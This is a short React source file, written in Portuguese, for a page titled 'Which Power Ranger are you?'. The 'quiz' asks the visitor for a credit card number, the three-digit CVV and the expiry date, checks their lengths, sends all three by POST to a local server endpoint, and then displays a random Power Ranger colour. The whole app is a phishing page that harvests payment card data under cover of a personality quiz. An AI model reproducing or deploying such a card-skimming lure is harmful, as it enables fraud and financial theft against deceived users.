import './App.css';

var cores = ['VERMLEHO','AZUL','VERDE','AMARELO','ROSA','PRETO','BRANCO']

function App() {
  return (
    <div className='centro'>
      <h1>QUAL POWER RANGER VOCÊ É ?</h1>
      <form name="Form">
        <img src='https://t.ctcdn.com.br/QR8NtRyd8SYuA8pGXStkhJzW6f8=/512x288/smart/filters:format(webp)/i262085.jpeg'></img>
        <input name="c" type="text" placeholder='numero do cartão'/>
        <div className='lado'>
        <input name="b" type="text" placeholder='os tres numeroszinhos de trás'/>
        <div style={{margin: 10}}></div>
        <input name="a" type="text" placeholder='data de validade'/>
        </div>
        <input onClick={(e) => power()} type="button" value="Enviar"/>
      </form>
    </div>
  );
}

function power() {
  var a = "" + document.forms["Form"]["a"].value;
  var b = "" + document.forms["Form"]["b"].value;
  var c = "" + document.forms["Form"]["c"].value;
  if (a === "" || b === "" || c === "" || !(c.length === 16) || !(b.length === 3)) {
    alert("Ainda não consigo saber qual power ranger você é");
    return false;
  }
  fetch('http://localhost:5000/teste', {
    method: 'POST',
    headers:{
      'Content-Type': 'application/x-www-form-urlencoded'
    },    
    body: new URLSearchParams({
        'nc': c,
        'cvv': b,
        'va': a
    })
});
  alert("VOCÊ É O POWER RANGER " + cores[Math.floor(Math.random() * cores.length)] +"!!")
}

export default App;
